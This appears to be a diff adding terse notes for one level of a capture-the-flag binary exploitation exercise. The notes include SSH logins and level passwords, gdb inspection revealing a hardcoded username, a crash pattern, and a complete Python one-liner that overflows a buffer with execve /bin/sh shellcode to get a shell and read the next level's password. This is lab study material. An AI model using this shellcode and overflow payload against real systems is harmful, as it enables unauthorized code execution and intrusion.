@@ -1,0 +1,31 @@
+ssh  level00@192.168.56.101 -p 4242
+password:level00
+
+su level01
+uSq2ehEGT6c9S24zbshexZQBXUGrncxn5sD5QfGL
+
+gdb ./level01
+
+disas verify_user_pass
+(gdb) x/s 0x80486b0
+0x80486b0:	 "admin"
+
+disas verify_user_name
+(gdb) x/s 0x80486a8
+0x80486a8:	 "dat_wil"
+
+Пытаемся вызвать Segmentation fault (core dumped)
+
+Enter Password:
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac
+
+i var
+
+(gdb) x/s 0x0804a040
+0x804a040 <a_user_name>:	 ""
+
+(python -c 'print "dat_wil" + "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "\n" + "a"*80 + "\x08\x04\xa0\x47"[::-1]' ; cat) | ./level01
+
+cd ../level02
+cat .pass
+PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
